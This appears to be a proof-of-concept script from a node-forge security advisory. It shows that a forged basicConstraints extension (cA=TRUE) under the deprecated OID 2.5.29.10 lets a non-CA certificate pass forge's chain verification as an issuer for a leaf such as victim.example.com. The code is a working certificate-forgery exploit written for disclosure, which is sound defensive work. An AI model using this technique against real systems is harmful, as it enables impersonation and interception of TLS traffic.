// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-5x38-2vff-x55p
//
// WorkOS Security Team (@nickcollisson-workos)

const forge = require('../..');
const { pki, asn1 } = forge;

const rootKeys = pki.rsa.generateKeyPair({ bits: 1024 });
const eeKeys = pki.rsa.generateKeyPair({ bits: 1024 });
const leafKeys = pki.rsa.generateKeyPair({ bits: 1024 });

function makeCert(serial, subject, issuer, publicKey, signingKey, extensions) {
  const cert = pki.createCertificate();
  cert.publicKey = publicKey;
  cert.serialNumber = serial;
  cert.validity.notBefore = new Date('2026-01-01T00:00:00Z');
  cert.validity.notAfter = new Date('2027-01-01T00:00:00Z');
  cert.setSubject([{ name: 'commonName', value: subject }]);
  cert.setIssuer([{ name: 'commonName', value: issuer }]);
  if (extensions) cert.setExtensions(extensions);
  cert.sign(signingKey, forge.md.sha256.create());
  // round-trip through PEM: the verifier only sees serialized bytes
  return pki.certificateFromPem(pki.certificateToPem(cert));
}

// BasicConstraints ::= SEQUENCE { cA TRUE }, under the deprecated OID 2.5.29.10
const forgedBc = {
  id: '2.5.29.10',
  critical: false,
  value: asn1
    .toDer(
      asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
        asn1.create(asn1.Class.UNIVERSAL, asn1.Type.BOOLEAN, false, String.fromCharCode(0xff)),
      ]),
    )
    .getBytes(),
};
const genuineBc = { name: 'basicConstraints', cA: false };

const root = makeCert('01', 'Root CA', 'Root CA', rootKeys.publicKey, rootKeys.privateKey, [
  { name: 'basicConstraints', cA: true, critical: true },
]);
const caStore = pki.createCaStore([root]);

// end-entity certs issued by the root; leaf signed by the end-entity key
const control = makeCert('02', 'end-entity', 'Root CA', eeKeys.publicKey, rootKeys.privateKey, [genuineBc]);
const attack = makeCert('02', 'end-entity', 'Root CA', eeKeys.publicKey, rootKeys.privateKey, [forgedBc, genuineBc]);
const leaf = makeCert('03', 'victim.example.com', 'end-entity', leafKeys.publicKey, eeKeys.privateKey);

function verify(ee) {
  try {
    pki.verifyCertificateChain(caStore, [leaf, ee]);
    return 'VERIFIED';
  } catch (e) {
    return 'REJECTED (' + e.error + ')';
  }
}

console.log('control (genuine cA=false only):', verify(control));
console.log('attack  (+ forged 2.5.29.10)   :', verify(attack));
const bc = attack.getExtension('basicConstraints');
console.log('getExtension(basicConstraints) : id=' + bc.id + ' cA=' + bc.cA);
